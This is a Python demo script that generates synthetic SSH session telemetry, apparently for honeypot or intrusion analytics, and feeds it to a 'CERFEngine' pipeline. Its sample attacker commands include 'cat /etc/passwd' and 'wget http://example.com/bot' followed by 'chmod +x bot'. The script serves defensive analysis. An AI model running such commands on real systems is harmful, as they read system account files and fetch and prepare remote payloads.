import pandas as pd
import numpy as np
from src.analytics import CERFEngine

def generate_synthetic_data(num_sessions=10, script_type="A"):
    rows = []
    for i in range(num_sessions):
        session_id = f"session_{script_type}_{i:03d}"
        source_ip = f"10.0.{1 if script_type == 'A' else 2}.{i}"
        
        for cmd_idx in range(50):
            regime = "baseline"
            if cmd_idx >= 37: regime = "fs_latency"
            elif cmd_idx >= 25: regime = "jitter"
            elif cmd_idx >= 12: regime = "slowdown"
                
            dt = 0
            if cmd_idx > 0:
                if script_type == "A":
                    if regime == "baseline": dt = 1_000_000
                    elif regime == "slowdown": dt = 100_000_000
                    elif regime == "jitter": dt = np.random.randint(50, 200) * 1_000_000
                    elif regime == "fs_latency": dt = 200_000_000
                else:
                    dt = 500_000_000
                    
            cmd = "ls -la" if cmd_idx % 2 == 0 else "cat /etc/passwd"
            if script_type == "B":
                cmd = "wget http://example.com/bot" if cmd_idx % 2 == 0 else "chmod +x bot"
                
            rows.append({
                "session_id": session_id,
                "timestamp_ns": 1000 + dt,
                "source_ip": source_ip,
                "protocol": "SSH",
                "command_index": cmd_idx,
                "command_raw": cmd,
                "command_root": cmd.split()[0],
                "current_path": "/home",
                "regime": regime,
                "delta_t_ns": dt,
                "response_sent": True
            })
    return pd.DataFrame(rows)

print("Generating demo telemetry data...")
df_a = generate_synthetic_data(num_sessions=20, script_type="A")
df_b = generate_synthetic_data(num_sessions=15, script_type="B")

combined_df = pd.concat([df_a, df_b]).reset_index(drop=True)
combined_df.to_csv("telemetry.csv", index=False)

print("Running CERF Analytics Engine...")
engine = CERFEngine(telemetry_path="telemetry.csv", output_dir=".")
engine.run_pipeline()

print("Demo data generated! Check your dashboard.")
